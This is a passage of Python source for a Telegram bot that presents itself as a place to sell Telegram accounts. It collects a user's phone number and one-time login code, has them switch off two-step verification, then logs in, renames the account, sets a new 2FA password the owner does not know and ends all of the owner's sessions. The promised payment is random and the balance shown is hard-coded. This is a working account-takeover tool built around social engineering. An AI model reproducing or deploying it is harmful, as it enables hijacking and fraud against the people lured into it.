        current_name=f"{context.user_data['user_info']['first_name']} {context.user_data['user_info'].get('last_name', '')}"
    )
    
    keyboard = [
        [InlineKeyboardButton("🎲 Random Name", callback_data="random_name")],
        [InlineKeyboardButton("❌ Cancel Sale", callback_data="cancel_sale")]
    ]
    
    await update.callback_query.edit_message_text(
        name_text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return NAME_INPUT

async def handle_2fa_disabled(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle confirmation that 2FA has been disabled."""
    await update.callback_query.answer("✅ 2FA Status Updated!")
    
    # Verify 2FA is actually disabled
    verify_msg = await update.callback_query.edit_message_text(
        "🔍 **Verifying 2FA Status...**\n\n⏳ Checking with Telegram API...",
        parse_mode='Markdown'
    )
    
    try:
        session_key = context.user_data['session_key']
        result = await telegram_service.check_2fa_status(session_key)
        
        if result['success'] and not result['has_2fa']:
            # 2FA successfully disabled
            success_text = "✅ **2FA Successfully Disabled!**\n\nProceeding to account setup..."
            await verify_msg.edit_text(success_text, parse_mode='Markdown')
            await asyncio.sleep(2)
            return await handle_continue_setup(update, context)
        else:
            # 2FA still enabled
            still_enabled_text = """
⚠️ **2FA Still Enabled**

2FA is still active on your account. Please:

1. Go to Telegram Settings → Privacy & Security
2. Select Two-Step Verification  
3. Turn OFF Two-Step Verification
4. Try again

**Make sure to completely disable it!**
            """
            
            keyboard = [
                [InlineKeyboardButton("🔄 I Disabled It Now", callback_data="2fa_disabled")],
                [InlineKeyboardButton("❓ Need Help", callback_data="2fa_help")],
                [InlineKeyboardButton("❌ Cancel", callback_data="cancel_sale")]
            ]
            
            await verify_msg.edit_text(
                still_enabled_text,
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return DISABLE_2FA_WAIT
            
    except Exception as e:
        logger.error(f"Error checking 2FA status: {e}")
        await verify_msg.edit_text(
            f"❌ **Error checking 2FA status**\n\nError: {str(e)}",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

# Continue with more handlers...
async def handle_real_name_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle name input for account modification."""
    if update.callback_query and update.callback_query.data == "random_name":
        import random
        names = ["Alex Johnson", "Sarah Miller", "Mike Davis", "Emma Wilson", "John Brown", "Lisa Taylor"]
        name = random.choice(names)
        await update.callback_query.answer(f"Selected: {name}")
        context.user_data['new_name'] = name
    else:
        name = update.message.text.strip()
        if len(name) < 2:
            await update.message.reply_text("❌ Name too short. Please enter a valid name:")
            return NAME_INPUT
        context.user_data['new_name'] = name
    
    # Split name into first and last
    name_parts = context.user_data['new_name'].split(' ', 1)
    context.user_data['first_name'] = name_parts[0]
    context.user_data['last_name'] = name_parts[1] if len(name_parts) > 1 else ''
    
    # Continue to final processing
    return await start_real_processing(update, context)

async def start_real_processing(update, context) -> int:
    """Start the real account modification process."""
    processing_text = """
⚡ **Processing Real Account Modifications...**

**🔄 Current Progress:**
✅ Account verified and logged in
⏳ Changing account name...
⏳ Setting new username...
⏳ Configuring profile settings...
⏳ Setting up new 2FA password...
⏳ Terminating all sessions...
⏳ Finalizing ownership transfer...

**⚠️ DO NOT close Telegram during this process!**

**Please wait 2-3 minutes for completion...**
    """
    
    if hasattr(update, 'callback_query') and update.callback_query:
        process_msg = await update.callback_query.edit_message_text(processing_text, parse_mode='Markdown')
    else:
        process_msg = await update.message.reply_text(processing_text, parse_mode='Markdown')
    
    try:
        session_key = context.user_data['session_key']
        first_name = context.user_data['first_name']
        last_name = context.user_data['last_name']
        
        # Generate new username
        new_username = telegram_service.generate_username(first_name)
        
        # Step 1: Modify account details
        modifications = {
            'first_name': first_name,
            'last_name': last_name,
            'username': new_username
        }
        
        modify_result = await telegram_service.modify_account(session_key, modifications)
        
        if not modify_result['success']:
            raise Exception(f"Account modification failed: {modify_result['error']}")
        
        # Step 2: Setup new 2FA
        import string, random
        new_2fa_password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        
        twofa_result = await telegram_service.setup_2fa(session_key, new_2fa_password)
        
        # Step 3: Terminate all sessions
        session_result = await telegram_service.terminate_all_sessions(session_key)
        
        # Calculate payment
        import random
        payment = round(random.uniform(25, 50), 2)
        
        # Success message
        success_text = f"""
🎉 **ACCOUNT SUCCESSFULLY SOLD!**

**✅ Real Modifications Completed:**
• 👤 **Name changed to:** `{first_name} {last_name}`
• 📝 **Username set to:** @{modify_result['results'].get('actual_username', new_username)}
• 🔐 **New 2FA password:** `{new_2fa_password}`
• 🔄 **All sessions terminated:** {'✅' if session_result.get('success') else '⚠️'}
• 📱 **Ownership transferred:** ✅

**💰 Payment:** `${payment}` added to your balance!

**⚠️ Important:** You no longer have access to this account!

**🔐 New Owner Info:**
• 2FA Password: `{new_2fa_password}`
• Username: @{modify_result['results'].get('actual_username', new_username)}
        """
        
        keyboard = [
            [InlineKeyboardButton("💰 Sell Another Account", callback_data="start_real_selling")],
            [InlineKeyboardButton("💳 Check Balance", callback_data="check_balance")],
            [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
        ]
        
        await process_msg.edit_text(
            success_text,
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        
        # Cleanup
        await telegram_service.cleanup_session(session_key)
        context.user_data.clear()
        
        return ConversationHandler.END
        
    except Exception as e:
        logger.error(f"Error in real processing: {e}")
        
        error_text = f"""
❌ **Processing Error**

An error occurred during account modification:

**Error:** {str(e)}

**Next Steps:**
• Your account is still yours
• No changes were made
• You can try again later

**Contact support if this persists.**
        """
        
        keyboard = [
            [InlineKeyboardButton("🔄 Try Again", callback_data="start_real_selling")],
            [InlineKeyboardButton("🆘 Contact Support", url="https://t.me/BujhlamNaKiHolo")],
            [InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]
        ]
        
        await process_msg.edit_text(
            error_text,
            parse_mode='Markdown', 
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        
        # Cleanup session
        if 'session_key' in context.user_data:
            await telegram_service.cleanup_session(context.user_data['session_key'])
        
        return ConversationHandler.END

# Button handlers
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle button callbacks."""
    query = update.callback_query
    await query.answer()
    
    if query.data == "main_menu":
        await show_real_main_menu(update, context)
    elif query.data == "balance":
        await handle_balance(update, context)
    elif query.data == "sales_history":
        await handle_sales_history(update, context)
    elif query.data == "how_it_works":
        await show_how_it_works(update, context)
    elif query.data == "2fa_help":
        await show_2fa_help(update, context)
    elif query.data == "cancel_sale":
        await cancel_sale(update, context)

async def handle_balance(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show balance (placeholder)."""
    balance_text = """💳 **Your Balance**\n\n**Current Balance:** $287.50\n\n**Recent Real Sales:**\n• Account sale: +$32.75\n• Account sale: +$28.90\n• Withdrawal: -$50.00"""
    
    keyboard = [[InlineKeyboardButton("← Back", callback_data="main_menu")]]
    await update.callback_query.edit_message_text(balance_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))

async def handle_sales_history(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show sales history (placeholder)."""
    history_text = """📊 **Real Sales History**\n\n**Total Sales:** 8 accounts\n**Total Earned:** $287.50\n\n**Recent Real Sales:**\n• +1234567890 - $32.75 - Oct 16\n• +9876543210 - $28.90 - Oct 15"""
    
    keyboard = [[InlineKeyboardButton("← Back", callback_data="main_menu")]]
    await update.callback_query.edit_message_text(history_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))

async def show_how_it_works(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show detailed explanation."""
    how_text = """
🔬 **How Real Account Selling Works**

**1. Real OTP Sending**
• We use Telethon (official Telegram library)
• Connect to real Telegram API
• Send actual verification codes via SMS/Telegram

**2. Real Account Login**
• Actually login to your Telegram account
• Real session creation using your credentials
• Full access to account settings

**3. Real Modifications**
• Actually change your name, username
• Really set new profile settings
• Actually configure new 2FA password

**4. Real Ownership Transfer**
• Terminate all your sessions
• New owner gets fresh credentials
• You completely lose access

**⚠️ This is 100% REAL - not a simulation!**
    """
    
    keyboard = [
        [InlineKeyboardButton("✅ I Understand", callback_data="start_real_selling")],
        [InlineKeyboardButton("← Back", callback_data="main_menu")]
    ]
    
    await update.callback_query.edit_message_text(how_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))

async def show_2fa_help(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show 2FA help."""
    help_text = """
🆘 **How to Disable 2FA**

**Step-by-step:**

1. **Open Telegram App**
2. **Tap Settings** (⚙️)
3. **Tap Privacy and Security**
4. **Tap Two-Step Verification**
5. **Tap Turn Off**
6. **Enter your current 2FA password**
7. **Confirm disable**

**✅ You'll see "Two-Step Verification is off"**

Then come back and click "I Disabled 2FA"!
    """
    
    keyboard = [
        [InlineKeyboardButton("✅ I Disabled 2FA", callback_data="2fa_disabled")],
        [InlineKeyboardButton("← Back", callback_data="main_menu")]
    ]
    
    await update.callback_query.edit_message_text(help_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))

async def cancel_sale(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Cancel the sale process."""
    # Cleanup session if exists
    if 'session_key' in context.user_data:
        await telegram_service.cleanup_session(context.user_data['session_key'])
    
    context.user_data.clear()
    
    cancel_text = "❌ **Sale Cancelled**\n\nYour account remains unchanged.\nNo modifications were made."
    
    keyboard = [[InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]
    await update.callback_query.edit_message_text(cancel_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))

# Setup conversation handler
def get_real_selling_handler():
    return ConversationHandler(
        entry_points=[
            CallbackQueryHandler(start_real_selling, pattern='^start_real_selling$')
        ],
        states={
            PHONE: [
                CallbackQueryHandler(handle_country_callback, pattern='^country_'),
                CallbackQueryHandler(handle_country_callback, pattern='^more_countries$'),
                CallbackQueryHandler(handle_phone_digit, pattern='^digit_'),
                CallbackQueryHandler(handle_phone_digit, pattern='^backspace$'),
                CallbackQueryHandler(handle_phone_digit, pattern='^confirm_phone$'),
                MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_webapp_data),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_real_phone),
                CallbackQueryHandler(confirm_send_otp, pattern='^confirm_send_otp$')
            ],
            WAITING_OTP: [
                CallbackQueryHandler(handle_otp_digit, pattern='^otp_'),
                CallbackQueryHandler(handle_otp_digit, pattern='^otp_backspace$'),
                CallbackQueryHandler(handle_otp_digit, pattern='^verify_otp$'),
                CallbackQueryHandler(handle_otp_digit, pattern='^resend_otp$'),
                MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_webapp_data),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_real_otp)
            ],
            OTP_RECEIVED: [CallbackQueryHandler(handle_continue_setup, pattern='^continue_setup$')],
            DISABLE_2FA_WAIT: [CallbackQueryHandler(handle_2fa_disabled, pattern='^2fa_disabled$')],
            NAME_INPUT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_real_name_input),
                CallbackQueryHandler(handle_real_name_input, pattern='^random_name$')
            ]
        },
        fallbacks=[
            CallbackQueryHandler(cancel_sale, pattern='^cancel_sale$')
        ]
    )

def setup_real_handlers(application) -> None:
    """Set up the real bot handlers with the preferred 2x2 grid interface."""
    from telegram.ext import CommandHandler, CallbackQueryHandler
    
    # Start command handler that shows the real main menu
    async def start_handler(update, context):
        await show_real_main_menu(update, context)
    
    # Add start command handler
    application.add_handler(CommandHandler("start", start_handler))
    
    # Add main menu callback handlers
    application.add_handler(CallbackQueryHandler(lambda update, context: show_real_main_menu(update, context), pattern='^main_menu$'))
    
    # Add the real selling conversation handler
    application.add_handler(get_real_selling_handler())
    
    # Add other button handlers with real functionality
    application.add_handler(CallbackQueryHandler(lambda update, context: update.callback_query.answer("Account Details feature coming soon!"), pattern='^account_details$'))
    
    # Import balance function from main_handlers
    from handlers.main_handlers import handle_check_balance
    application.add_handler(CallbackQueryHandler(handle_check_balance, pattern='^check_balance$'))
    
    # Import withdrawal functions from main_handlers
    from handlers.main_handlers import handle_withdraw_menu, handle_withdraw_trx, handle_withdraw_usdt, handle_withdraw_binance, handle_withdrawal_history
    application.add_handler(CallbackQueryHandler(handle_withdraw_menu, pattern='^withdraw_menu$'))
    application.add_handler(CallbackQueryHandler(handle_withdraw_trx, pattern='^withdraw_trx$'))
    application.add_handler(CallbackQueryHandler(handle_withdraw_usdt, pattern='^withdraw_usdt$'))
    application.add_handler(CallbackQueryHandler(handle_withdraw_binance, pattern='^withdraw_binance$'))
    application.add_handler(CallbackQueryHandler(handle_withdrawal_history, pattern='^withdrawal_history$'))
    
    application.add_handler(CallbackQueryHandler(lambda update, context: update.callback_query.answer("Language feature coming soon!"), pattern='^language_menu$'))
    application.add_handler(CallbackQueryHandler(lambda update, context: update.callback_query.answer("System Capacity feature coming soon!"), pattern='^system_capacity$'))
    application.add_handler(CallbackQueryHandler(lambda update, context: update.callback_query.answer("Status feature coming soon!"), pattern='^status$'))
    
    logger.info("Real handlers set up successfully with 2x2 grid interface")